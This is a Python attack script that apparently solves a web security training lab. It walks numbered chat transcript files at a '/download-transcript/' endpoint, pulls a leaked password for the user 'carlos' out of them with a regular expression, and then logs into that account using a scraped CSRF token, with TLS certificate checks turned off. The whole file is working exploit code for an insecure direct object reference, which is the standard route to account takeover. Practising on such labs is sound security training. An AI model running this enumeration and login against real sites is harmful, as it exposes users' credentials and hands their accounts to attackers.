import re
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    """Fetching csrf token from webiste"""
    print("(+) Fetching csrf token ...")
    response = session.get(url+"/login" , verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input",{"name":"csrf"})["value"]
    return csrf_token




def find_carlos_password(session , url):
    csrf_token = get_csrf_token(session, url)
    print("(+) Finding Carlos Password ...")
    transcript_url = url+"/download-transcript/"
    for i in range(11):
        i = str(i)

        response = requests.get(transcript_url+i+".txt" , verify=False)
        if "Ok so my password is" in response.text:
            pattern = r"Ok so my password is (\w+)"
            password = re.search(pattern,response.text).group(1)
            print(f"(+) Carlos password found : {password}")
            print("(+) Attempting login carlos account ...")
            login_data = {
                "username":"carlos",
                "password": password,
                "csrf":csrf_token
            }
            response = session.post(url+"/login" , data=login_data , verify=False)
            if "Log out" in response.text:
                print("(+) Login Succesfully ..")
                print("(+) Lib Solve Successfully ..")
            else:
                print("(-) Failed to Login ...")
                
            break
        


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>"% sys.argv[0])
        print("(+) Example: %s www.example.com"% sys.argv[0])
    url = sys.argv[1]
    session = requests.Session()
    try:

        print("Validating the Target ..")
        response = session.get(url)
        if response.status_code ==200:
            print("(+) Target is Reachable ")
        else:
            print("(-) Target is Unreachable")
            sys.exit(-1)
    except(requests.exceptions.ConnectTimeout):
        print("Connection Timeout ...")
    find_carlos_password(session, url)

if __name__ == "__main__":
    main()